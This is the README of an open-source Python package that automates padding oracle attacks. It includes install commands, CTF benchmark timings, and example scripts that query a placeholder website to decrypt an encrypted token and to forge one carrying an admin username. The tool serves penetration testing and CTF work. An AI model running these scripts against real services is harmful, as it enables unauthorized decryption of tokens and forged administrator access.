# Padding Oracle Python Automation Script 

![python-package-badge](https://github.com/djosix/padding_oracle.py/actions/workflows/python-package.yml/badge.svg)

The padding_oracle.py is a highly efficient, threaded [padding oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack) attack automation script, specifically developed for Python 3.

## Installation

You can install the package using either PyPI or directly from GitHub:

**Via PyPI:**
```shell
pip3 install -U padding_oracle
```

**Via GitHub:**
```shell
pip3 install -U git+https://github.com/djosix/padding_oracle.py.git
```

## Performance Metrics

Performance of padding_oracle.py was evaluated using [0x09] Cathub Party from EDU-CTF:

| Number of Request Threads | Time Taken |
|-----------------|----------------|
| 1               | 17m 43s        |
| 4               | 5m 23s         |
| 16              | 1m 20s         |
| 64              | 56s            |

## How to Use

### Decryption

To illustrate the usage, consider an example of testing `https://vulnerable.website/api/?token=M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94%3D`:

```python
from padding_oracle import padding_oracle, base64_encode, base64_decode
import requests

sess = requests.Session() # use connection pool
url = 'https://vulnerable.website/api/'

def oracle(ciphertext: bytes):
    resp = sess.get(url, params={'token': base64_encode(ciphertext)})

    if 'failed' in resp.text:
        return False # e.g. token decryption failed
    elif 'success' in resp.text:
        return True
    else:
        raise RuntimeError('unexpected behavior')

ciphertext: bytes = base64_decode('M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94=')
# len(ciphertext) is 32
# possibly be "IV + cipher block" if block size is 16

assert len(ciphertext) % 16 == 0

plaintext = padding_oracle(
    ciphertext,
    block_size = 16,
    oracle = oracle,
    num_threads = 16,
)
```

### Encryption

To illustrate the usage, consider an example of forging a token for `https://vulnerable.website/api/?token=<.....>` :

```python
from padding_oracle import padding_oracle, base64_encode, base64_decode
import requests

sess = requests.Session() # use connection pool
url = 'https://vulnerable.website/api/'

def oracle(ciphertext: bytes):
    resp = sess.get(url, params={'token': base64_encode(ciphertext)})

    if 'failed' in resp.text:
        return False # e.g. token decryption failed
    elif 'success' in resp.text:
        return True
    else:
        raise RuntimeError('unexpected behavior')

payload: bytes =b"{'username':'admin'}"

ciphertext = padding_oracle(
    payload,
    block_size = 16,
    oracle = oracle,
    num_threads = 16,
    mode = 'encrypt'
)
```

In addition, the package provides PHP-like encoding/decoding functions:

```python
from padding_oracle.encoding import (
    urlencode,
    urldecode,
    base64_encode,
    base64_decode,
)
```

## License

Padding Oracle Python Automation Script is distributed under the terms of the MIT license.

<!-- PiuPiuPiu -->
